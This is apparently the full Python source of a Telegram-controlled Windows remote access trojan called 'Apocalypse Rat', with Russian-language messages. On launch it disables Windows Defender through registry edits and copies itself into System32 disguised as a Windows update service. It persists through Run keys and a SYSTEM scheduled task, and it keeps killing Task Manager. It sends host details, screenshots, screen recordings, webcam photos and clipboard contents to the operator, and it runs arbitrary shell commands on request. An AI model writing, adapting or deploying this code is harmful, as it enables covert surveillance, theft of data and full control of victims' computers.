import os
import random
import string
import cv2
import sys
import time
import shutil
import psutil
import ctypes
import telebot
import requests
import pymsgbox
import platform
import pyautogui
import pyperclip
import webbrowser
import subprocess
import numpy as np
import tkinter as tk
from tkinter import scrolledtext
from PIL import ImageGrab
from os import getlogin
from telebot import types
import win32com.client
import socket
import winreg
import threading
bot_token = "token"
adm = "id"
bot = telebot.TeleBot(bot_token)
username = getlogin()
computer_name = socket.gethostname()
PROCESS_NAME = "WindowsUpdateService.exe"
os.system(r"""
set vers=15
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
""")
def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return f"IP: {data.get('ip', 'N/A')}\nГород: {data.get('city', 'N/A')}\nРегион: {data.get('region', 'N/A')}\nСтрана: {data.get('country', 'N/A')}\nПровайдер: {data.get('org', 'N/A')}"
    except:
        return "Не удалось получить информацию об IP"
def screen():
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + f'\\Sreenshot.jpg')
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
    files = {'photo': screen}
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + adm, files=files)
def get_hwid():
    wmi = win32com.client.GetObject("winmgmts:")
    hwid = wmi.InstancesOf("Win32_ComputerSystemProduct")[0].UUID
    return hwid
def send_direct():
    directory = os.path.abspath(os.getcwd())
    bot.send_message(adm, "📂\n" + str(directory))
def send_ls():
    try:
        dirs = '\n'.join(os.listdir(path="."))
        bot.send_message(adm, "Files: " + "\n" + dirs)
    except:
        bot.send_message(adm, "❌ Ошибка! файл введен неверно!")
def send_info():
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version()
    ip_info = get_ip_info()
    bot.send_message(adm, f"PC: {username}\nИмя компьютера: {computer_name}\nOS: {windows}\nProcessor: {processor}\nVersion OS: {systemali}\n\n{ip_info}")
def open_url(message):
    url = message.text
    try:
        webbrowser.open_new_tab(url)
        bot.send_message(adm, f"Ссылка - {url} открыта!")
        screen()
    except:
        bot.send_message(adm, "❌ Ошибка! ссылка введена неверно!")
def messagebox(message):
    pass
def add_to_startup():
    """Добавляет программу в автозагрузку"""
    try:
        current_file = sys.argv[0]
        file_name = PROCESS_NAME
        target_dir = os.path.join(os.environ['SYSTEMROOT'], 'System32')
        target_path = os.path.join(target_dir, file_name)
        shutil.copy2(current_file, target_path)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            reg_key = winreg.OpenKey(registry, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(reg_key)
        except:
            pass
        try:
            registry = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
            reg_key = winreg.OpenKey(registry, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(reg_key)
        except:
            pass
        try:
            subprocess.run([
                'schtasks', '/create', '/tn', 'WindowsUpdateService',
                '/tr', f'"{target_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/f'
            ], shell=True, capture_output=True)
        except:
            pass
        return True
    except Exception as e:
        return False
def protect_process():
    """Защита процесса от закрытия"""
    while True:
        try:
            output = subprocess.check_output('tasklist /fi "imagename eq WindowsUpdateService.exe"', shell=True, text=True)
            if "WindowsUpdateService.exe" not in output:
                current_file = sys.argv[0]
                subprocess.Popen([current_file], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.call('taskkill /f /im taskmgr.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        time.sleep(5)
def hide_from_taskmanager():
    """Попытка скрыть процесс из диспетчера задач"""
    try:
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
        registry = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        try:
            reg_key = winreg.CreateKey(registry, key_path)
            winreg.SetValueEx(reg_key, "Debugger", 0, winreg.REG_SZ, "svchost.exe")
            winreg.CloseKey(reg_key)
        except:
            pass
    except:
        pass
def startup():
    """Команда для ручного добавления в автозагрузку"""
    if add_to_startup():
        bot.send_message(adm, '✅ Успешно добавлено в автозагрузку и защищено!')
    else:
        bot.send_message(adm, '❌ Ошибка добавления в автозагрузку')
def send_tasklist():
    try:
        os.system('tasklist> C:\\ProgramData\\Tasklist.txt')
        tasklist = open('C:\\ProgramData\\Tasklist.txt')
        bot.send_document(adm, tasklist)
        tasklist.close()
        os.remove('C:\\ProgramData\\Tasklist.txt')
    except:
        bot.send_message(adm, 'Error > Tasklist')
def kill_process(message):
    process_name = message.text
    try:
        subprocess.call(f"taskkill /f /im {process_name}.exe")
        bot.send_message(adm, f"Процесс {process_name} остановлен")
        screen()
    except:
        bot.send_message(adm, '❌ Неверный синтаксис команды.\nПопробуй\n/kill {имя процесса без расширения}')
def handle_file_upload(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    save_path = os.path.join(os.getcwd(), message.document.file_name)
    with open(save_path, 'wb') as new_file:
        new_file.write(downloaded_file)
    bot.send_message(adm, f"Файл {message.document.file_name} загружен в директорию {save_path}")
def open_file(message):
    file_path = message.text
    try:
        os.startfile(file_path)
        bot.send_message(adm, f"Файл {file_path} успешно открыт!")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка! Не удалось открыть файл {file_path}. Причина: {e}")
def get_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        bot.send_message(adm, f"📋 Буфер обмена:\n{clipboard_content}")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка доступа к буферу обмена: {e}")
def record_screen():
    try:
        screen_size = pyautogui.size()
        video_output = os.path.join(os.getenv("APPDATA"), "screen_record.mp4")
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(video_output, fourcc, 20.0, screen_size)
        start_time = time.time()
        while int(time.time() - start_time) < 15:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        video = open(video_output, 'rb')
        bot.send_video(adm, video)
        video.close()
        os.remove(video_output)
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка записи видео: {e}")
def execute_shell_command(message):
    command = message.text
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            bot.send_message(adm, f"🖥️ Результат выполнения команды:\n```\n{stdout}\n```", parse_mode='Markdown')
        else:
            bot.send_message(adm, f"⚠️ Команда выполнена, но с ошибкой:\n```\n{stderr}\n```", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка выполнения команды:\n```\n{e}\n```", parse_mode='Markdown')
def move_mouse(message):
    try:
        coordinates = message.text.split(',')
        x = int(coordinates[0].strip())
        y = int(coordinates[1].strip())
        pyautogui.moveTo(x, y)
        bot.send_message(adm, f"🖱️ Мышка перемещена в координаты ({x}, {y}).")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка перемещения мышки: {e}")
def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if not ret:
            bot.send_message(adm, "❌ Веб-камера не обнаружена.")
            return
        img_path = os.path.join(os.getenv("APPDATA"), "webcam_photo.jpg")
        cv2.imwrite(img_path, frame)
        cam.release()
        img = open(img_path, 'rb')
        bot.send_photo(adm, img)
        os.remove(img_path)
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка съемки с веб-камеры: {e}")
def copy_file(message):
    try:
        src, dest = message.text.split(',')
        shutil.copy2(src.strip(), dest.strip())
        bot.send_message(adm, f"📂 Файл скопирован из {src.strip()} в {dest.strip()}.")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка копирования файла: {e}")
def move_file(message):
    try:
        src, dest = message.text.split(',')
        shutil.move(src.strip(), dest.strip())
        bot.send_message(adm, f"📂 Файл перемещен из {src.strip()} в {dest.strip()}.")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка перемещения файла: {e}")
def delete_file(message):
    try:
        file_path = message.text.strip()
        os.remove(file_path)
        bot.send_message(adm, f"🗑️ Файл {file_path} удален.")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка удаления файла: {e}")
def system_monitor():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_info = psutil.disk_usage('/')
        bot.send_message(adm, f"📊 Состояние системы:\n\n"
                              f"💻 ЦП: {cpu_usage}%\n"
                              f"🧠 Память: {memory_info.percent}%\n"
                              f"💽 Диск: {disk_info.percent}%")
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка мониторинга системы: {e}")
def shutdown_pc():
    try:
        bot.send_message(adm, "⏳ Выключение ПК...")
        os.system("shutdown /s /t 1")
    except Exception as e:
        bot.send_message(adm, f"❌ *Ошибка выключения ПК*: {e}")
def restart_pc():
    try:
        bot.send_message(adm, "🔄 Перезагрузка ПК...")
        os.system("shutdown /r /t 1")
    except Exception as e:
        bot.send_message(adm, f"❌ *Ошибка перезагрузки ПК*: {e}")
def ask_messagebox_title(message):
    title = message.text
    bot.send_message(adm, "📝 *Введите описание для сообщения в Messagebox*: ", parse_mode='Markdown')
    bot.register_next_step_handler(message, lambda msg: send_messagebox(title, msg.text))
def send_messagebox(title, description):
    try:
        bot.send_message(adm, f"✉️ *Сообщение* \"{title}\" в *Messagebox отправлено успешно*!", parse_mode='Markdown')
        ctypes.windll.user32.MessageBoxW(0, description, title, 0x10 | 0x0)
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка отправки сообщения в Messagebox: {e}")
def prank_move_mouse():
    try:
        bot.send_message(adm, "🐭 *Прикол с мышкой начат!*", parse_mode='Markdown')
        duration = 10
        start_time = time.time()
        while time.time() - start_time < duration:
            x, y = pyautogui.position()
            pyautogui.moveTo(x + 50, y, duration=0.5)
            time.sleep(0.5)
            pyautogui.moveTo(x - 100, y, duration=0.5)
            time.sleep(0.5)
        bot.send_message(adm, "🐭 *Прикол с мышкой завершен!*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(adm, f"❌ Ошибка при выполнении прикола с мышкой: {e}")
def get_system_info():
    """Получает информацию о системе для отправки при запуске"""
    try:
        hwid = get_hwid()
        ip_info = get_ip_info()
        windows = platform.platform()
        processor = platform.processor()
        return (f'🥸 {username} *Подключился*!\n\n'
                f'```\n💻 Hwid: {hwid}\n'
                f'🖥️ Имя ПК: {computer_name}\n'
                f'🔢 Ядер CPU: {os.cpu_count()}\n```\n'
                f'📋 *Система*: {windows}\n'
                f'⚡ *Процессор*: {processor}\n\n'
                f'{ip_info}\n\n'
                f'💬 *Нажми* /help *для списка команд*.')
    except Exception as e:
        return f'🥸 {username} *Подключился*!\n\n❌ *Ошибка получения полной информации*: {str(e)}'
def setup_persistence():
    """Настройка персистентности при запуске"""
    add_to_startup()
    protection_thread = threading.Thread(target=protect_process, daemon=True)
    protection_thread.start()
    hide_from_taskmanager()
try:
    setup_persistence()
    system_info = get_system_info()
    bot.send_message(adm, system_info, parse_mode='Markdown')
    bot.send_message(adm, "🛡️ *Автозагрузка и защита активированы!*", parse_mode='Markdown')
except Exception as e:
    bot.send_message(adm, f'❌ Ошибка при настройке: {str(e)}')
@bot.message_handler(commands=['start', 'help'])
def show_help(message):
    help_text = """
🤖 *Apocalypse Rat - Список команд*:
📁 *Файловые операции*:
/direct - Текущая директория
/ls - Файлы в текущей директории
/upload - Загрузить файл (отправьте файл после команды)
/openfile <путь> - Открыть файл
/copy <src>,<dest> - Копировать файл
/move <src>,<dest> - Переместить файл
/delete <путь> - Удалить файл
🖥️ *Системные команды*:
/info - Информация о системе
/tasklist - Список процессов
/kill <процесс> - Убить процесс
/shell <команда> - Выполнить shell команду
/monitor - Мониторинг системы
/shutdown - Выключить ПК
/restart - Перезагрузить ПК
/startup - Добавить в автозагрузку (ручное)
🎮 *Управление*:
/screen - Скриншот
/video - Запись экрана (15 сек)
/webcam - Фото с вебкамеры
/url <ссылка> - Открыть ссылку
/clipboard - Буфер обмена
/mousemove <x>,<y> - Переместить мышь
/mouseprank - Прикол с мышкой
/messagebox - Показать сообщение
⚙️ *Другие команды*:
/help - Справка по командам
💡 *Примеры*:
/openfile C:\\file.txt
/kill chrome
/shell dir
/copy C:\\file.txt,D:\\backup\\file.txt
/mousemove 100,200
"""
    bot.send_message(adm, help_text, parse_mode='Markdown')
@bot.message_handler(commands=['direct'])
def handle_direct(message):
    send_direct()
@bot.message_handler(commands=['ls'])
def handle_ls(message):
    send_ls()
@bot.message_handler(commands=['screen'])
def handle_screen(message):
    screen()
@bot.message_handler(commands=['info'])
def handle_info(message):
    send_info()
@bot.message_handler(commands=['url'])
def handle_url(message):
    url = message.text.replace('/url ', '').strip()
    if url:
        try:
            webbrowser.open_new_tab(url)
            bot.send_message(adm, f"🔗 Ссылка {url} открыта!")
            screen()
        except:
            bot.send_message(adm, "❌ Ошибка! Неверная ссылка.")
    else:
        bot.send_message(adm, "❌ Укажите ссылку: /url https://example.com")
@bot.message_handler(commands=['startup'])
def handle_startup(message):
    startup()
@bot.message_handler(commands=['tasklist'])
def handle_tasklist(message):
    send_tasklist()
@bot.message_handler(commands=['kill'])
def handle_kill(message):
    process_name = message.text.replace('/kill ', '').strip()
    if process_name:
        try:
            subprocess.call(f"taskkill /f /im {process_name}.exe")
            bot.send_message(adm, f"❌ Процесс {process_name} остановлен")
            screen()
        except:
            bot.send_message(adm, f"❌ Не удалось остановить процесс {process_name}")
    else:
        bot.send_message(adm, "❌ Укажите имя процесса: /kill chrome")
@bot.message_handler(content_types=['document'])
def handle_document(message):
    handle_file_upload(message)
@bot.message_handler(commands=['openfile'])
def handle_openfile(message):
    file_path = message.text.replace('/openfile ', '').strip()
    if file_path:
        open_file(message)
    else:
        bot.send_message(adm, "❌ Укажите путь к файлу: /openfile C:\\file.txt")
@bot.message_handler(commands=['clipboard'])
def handle_clipboard(message):
    get_clipboard()
@bot.message_handler(commands=['video'])
def handle_video(message):
    bot.send_message(adm, '🎥 Записываю видео...')
    record_screen()
@bot.message_handler(commands=['messagebox'])
def handle_messagebox(message):
    parts = message.text.split(' ', 2)
    if len(parts) >= 3:
        title = parts[1]
        description = parts[2]
        send_messagebox(title, description)
    else:
        bot.send_message(adm, "❌ Укажите заголовок и текст: /messagebox Заголовок Текст")
@bot.message_handler(commands=['webcam'])
def handle_webcam(message):
    capture_webcam()
@bot.message_handler(commands=['shutdown'])
def handle_shutdown(message):
    shutdown_pc()
@bot.message_handler(commands=['restart'])
def handle_restart(message):
    restart_pc()
@bot.message_handler(commands=['shell'])
def handle_shell(message):
    command = message.text.replace('/shell ', '').strip()
    if command:
        execute_shell_command(message)
    else:
        bot.send_message(adm, "❌ Укажите команду: /shell dir")
@bot.message_handler(commands=['mousemove'])
def handle_mousemove(message):
    coords = message.text.replace('/mousemove ', '').strip()
    if coords:
        message.text = coords
        move_mouse(message)
    else:
        bot.send_message(adm, "❌ Укажите координаты: /mousemove 100,200")
@bot.message_handler(commands=['copy'])
def handle_copy(message):
    paths = message.text.replace('/copy ', '').strip()
    if paths:
        message.text = paths
        copy_file(message)
    else:
        bot.send_message(adm, "❌ Укажите пути: /copy C:\\file.txt,D:\\backup\\file.txt")
@bot.message_handler(commands=['move'])
def handle_move(message):
    paths = message.text.replace('/move ', '').strip()
    if paths:
        message.text = paths
        move_file(message)
    else:
        bot.send_message(adm, "❌ Укажите пути: /move C:\\file.txt,D:\\new\\file.txt")
@bot.message_handler(commands=['delete'])
def handle_delete(message):
    file_path = message.text.replace('/delete ', '').strip()
    if file_path:
        message.text = file_path
        delete_file(message)
    else:
        bot.send_message(adm, "❌ Укажите путь: /delete C:\\file.txt")
@bot.message_handler(commands=['monitor'])
def handle_monitor(message):
    system_monitor()
@bot.message_handler(commands=['mouseprank'])
def handle_mouseprank(message):
    prank_move_mouse()
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            time.sleep(5)